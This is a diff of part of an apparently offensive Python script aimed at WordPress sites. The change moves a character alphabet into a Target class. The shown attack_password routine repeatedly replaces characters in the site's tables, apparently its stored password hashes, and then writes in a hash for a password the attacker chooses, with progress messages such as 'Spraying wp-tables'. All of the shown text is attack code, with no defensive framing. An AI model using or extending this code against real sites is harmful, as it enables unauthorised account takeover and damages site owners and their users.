@@ -4,14 +4,13 @@ import optparse,sys
 import time
 import hashlib
 
-ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./"
-ALPHABET = list(ALPHABET)
-ALPHABET.append("$1$")
-ALPHABET.append("10")
-
 class Target(object):
 	"""The target to overwrite"""
 	def __init__(self, url, user,password):
+		self.ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./"
+		self.ALPHABET = list(self.ALPHABET)
+		self.ALPHABET.append("$1$")
+		self.ALPHABET.append("10")
 		self.url = self.sanitizeUrl(url)
 		self.user = user
 		self.password = password
@@ -45,14 +44,14 @@ class Target(object):
 
 	def attack_password(self):
 		good("Spraying wp-tables")
-		for x in range(0,len(ALPHABET)):
-			if x == len(ALPHABET)/4:
+		for x in range(0,len(self.ALPHABET)):
+			if x == len(self.ALPHABET)/4:
 				good("25% done")
-			elif x == len(ALPHABET)/2:
+			elif x == len(self.ALPHABET)/2:
 				good("50% done")
-			elif x == len(ALPHABET)/4*3:
+			elif x == len(self.ALPHABET)/4*3:
 				good("75% done")
-			self.replace(ALPHABET[x],'1')
+			self.replace(self.ALPHABET[x],'1')
 		good("Placing '"+self.password+"' as password")
 		for x in reversed(range(15,35)):
 			self.replace('1'*x,self.PASSWORD_HASH)
